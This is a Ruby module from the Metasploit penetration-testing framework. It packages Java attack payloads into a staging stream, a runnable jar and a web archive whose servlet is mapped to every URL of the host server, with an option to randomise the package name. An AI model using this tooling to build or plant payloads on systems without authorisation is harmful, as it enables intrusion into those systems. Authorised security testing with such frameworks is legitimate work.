# -*- coding: binary -*-
require 'msf/core'

module Msf::Payload::Java

  #
  # Used by stages; all java stages need to define +@stage_class_files+ as an
  # array of .class files located in data/java/
  #
  # The staging protocol expects any number of class files, each prepended
  # with its length, and terminated with a 0:
  #	[ 32-bit big endian length ][ first raw .class file]
  #	...
  #	[ 32-bit big endian length ][ Nth raw .class file]
  #	[ 32-bit null ]
  #
  def generate_stage
    stage = ''
    @stage_class_files.each do |path|
      fd = File.open(File.join( Msf::Config.data_directory, "java", path ), "rb")
      data = fd.read(fd.stat.size)
      fd.close
      stage << ([data.length].pack("N") + data)
    end
    stage << [0].pack("N")

    stage
  end

  #
  # Used by stagers to construct the payload jar file as a String
  #
  def generate
    generate_jar.pack
  end

  #
  # Used by stagers to create a jar file as a {Rex::Zip::Jar}.  Stagers
  # define a list of class files in @class_files which are pulled from
  # {Msf::Config.data_directory}.  The configuration file is created by
  # the payload's #config method.
  #
  # @option opts :main_class [String] the name of the Main-Class
  #   attribute in the manifest.  Defaults to "metasploit.Payload"
  # @option opts :random [Boolean] Set to `true` to randomize the
  #   "metasploit" package name.
  # @return [Rex::Zip::Jar]
  def generate_jar(opts={})
    raise if not respond_to? :config
    # Allow changing the jar's Main Class in the manifest so wrappers
    # around metasploit.Payload will work.
    main_class = opts[:main_class] || "metasploit.Payload"

    paths = [
      [ "metasploit", "Payload.class" ],
    ] + @class_files

    jar = Rex::Zip::Jar.new
    jar.add_sub("metasploit") if opts[:random]
    jar.add_file("metasploit.dat", config)
    jar.add_files(paths, File.join(Msf::Config.data_directory, "java"))
    jar.build_manifest(:main_class => main_class)

    jar
  end

  #
  # Like {#generate_jar}, this method is used by stagers to create a war file
  # as a Rex::Zip::Jar object.
  #
  # @param opts [Hash]
  # @option :app_name [String] Name of the \<servlet-name> attribute in the
  #   web.xml.  Defaults to random
  #
  def generate_war(opts={})
    raise if not respond_to? :config
    zip = Rex::Zip::Jar.new

    web_xml = %q{<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>NAME</servlet-name>
<servlet-class>metasploit.PayloadServlet</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>NAME</servlet-name>
<url-pattern>/*</url-pattern>
</servlet-mapping>
</web-app>
}
    app_name = opts[:app_name] || Rex::Text.rand_text_alpha_lower(rand(8)+8)

    web_xml.gsub!(/NAME/, app_name)

    paths = [
      [ "metasploit", "Payload.class" ],
      [ "metasploit", "PayloadServlet.class" ],
    ] + @class_files

    zip.add_file('WEB-INF/', '')
    zip.add_file('WEB-INF/web.xml', web_xml)
    zip.add_file("WEB-INF/classes/", "")
    zip.add_files(paths, File.join(Msf::Config.data_directory, "java"), "WEB-INF/classes/")
    zip.add_file("WEB-INF/classes/metasploit.dat", config)

    zip
  end

end

